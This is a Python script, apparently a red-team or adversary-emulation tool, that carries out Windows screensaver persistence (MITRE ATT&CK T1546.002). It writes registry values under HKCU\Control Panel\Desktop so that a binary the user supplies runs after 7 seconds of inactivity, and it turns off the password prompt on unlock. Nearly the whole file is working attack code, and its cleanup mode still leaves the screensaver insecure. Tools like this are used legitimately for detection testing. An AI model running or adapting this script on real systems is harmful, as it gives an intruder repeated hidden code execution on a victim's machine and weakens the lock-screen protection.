"""
Tactic: Persistence (TA0003)
Technique: Event Triggered Execution: Screensaver (T1546.002)
Short Description (Optional): Adversaries may establish persistence by executing malicious content triggered by user inactivity.
The following screensaver settings are stored in the Registry (HKCU\Control Panel\Desktop\) and could be manipulated to achieve persistence:

SCRNSAVE.exe - set to malicious PE path
ScreenSaveActive - set to '1' to enable the screensaver
ScreenSaverIsSecure - set to '0' to not require a password to unlock
ScreenSaveTimeout - sets user inactivity timeout before screensaver is executed
"""

import argparse
import datetime
import subprocess
import sys

parser = argparse.ArgumentParser(description="Persistence: Event Triggered Execution (Screensaver)")

parser.add_argument("-bp", "--binary-path",
                    default=False,
                    help='Enter your binary location to use for persistence. (Any binary with .scr extension (You can rename calc.exe to calc.scr and use it))')

parser.add_argument("-t", "--timeout",
                    default=7,
                    type=int,
                    help='Screensaver timeout in seconds. (Default: 7)')

parser.add_argument("-c", "--cleanup",
                    action="store_true",
                    help='Cleanup artifacts generated by the tool.')

options = parser.parse_args()

if not options.cleanup and not options.binary_path:
    print("[-] You must provide -bp switch if not using cleanup option.")
    sys.exit(0)

def current_time():
    return str(datetime.datetime.now())[:19]

def execute(command):
    try:
        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
    except Exception as e:
        print(f"[-] Failed To Execute Command.\n\t[Err] {e}")
        sys.exit(-1)
    return output.communicate()

if not options.cleanup:
    print(f"[*] Executing Attack. ({current_time()})")

    print(f"[*] Enabling ScreenSaver. ({current_time()}")
    command = r'reg add "HKCU\Control Panel\Desktop" /v "ScreenSaveActive" /t REG_SZ /d "1" /f'
    print(f"[+] Command: {command}")
    execute(command)

    print(f"[*] Setting screensaver to provided binary. ({current_time()})")
    command = rf'reg add "HKCU\Control Panel\Desktop" /v "SCRNSAVE.exe" /t REG_SZ /d "{options.binary_path}" /f'
    print(f"[+] Command: {command}")
    execute(command)

    print(f"[*] Making screensaver insecure. ({current_time()})")
    command = rf'reg add "HKCU\Control Panel\Desktop" /v "ScreenSaverIsSecure" /t REG_SZ /d "0" /f'
    print(f"[+] Command: {command}")
    execute(command)

    print(f"[*] Setting screensaver timeout to {options.timeout}. ({current_time()})")
    command = rf'reg add "HKCU\Control Panel\Desktop" /v "ScreenSaveTimeout" /t REG_SZ /d "{options.timeout}" /f'
    print(f"[+] Command: {command}")
    execute(command)

    print("[*] Finished! Wait For Your Binary To Open When System Is Inactive.")
    sys.exit(0)

if options.cleanup:
    print(f"[*] Cleaning Attack Artifacts On System. ({current_time()})")

    print(f"[*] Disabling ScreenSaver. ({current_time()})")
    command = r'reg add "HKCU\Control Panel\Desktop" /v "ScreenSaveActive" /t REG_SZ /d "0" /f'
    print(f"[+] Command: {command}")
    execute(command)

    print(f"[*] Removing Registry Key Related To Provided Binary. ({current_time()})")
    command = rf'reg delete "HKCU\Control Panel\Desktop" /v "SCRNSAVE.exe" /f'
    print(f"[+] Command: {command}")
    execute(command)

    print(f"[*] Making screensaver insecure (Does Not Require Password To Unlock). ({current_time()})")
    command = rf'reg add "HKCU\Control Panel\Desktop" /v "ScreenSaverIsSecure" /t REG_SZ /d "0" /f'
    print(f"[+] Command: {command}")
    execute(command)

    print(f"[*] Setting screensaver timeout to 60-Seconds. ({current_time()})")
    command = rf'reg add "HKCU\Control Panel\Desktop" /v "ScreenSaveTimeout" /t REG_SZ /d "60" /f'
    print(f"[+] Command: {command}")
    execute(command)

    print("[*] Finished!")
    sys.exit(0)
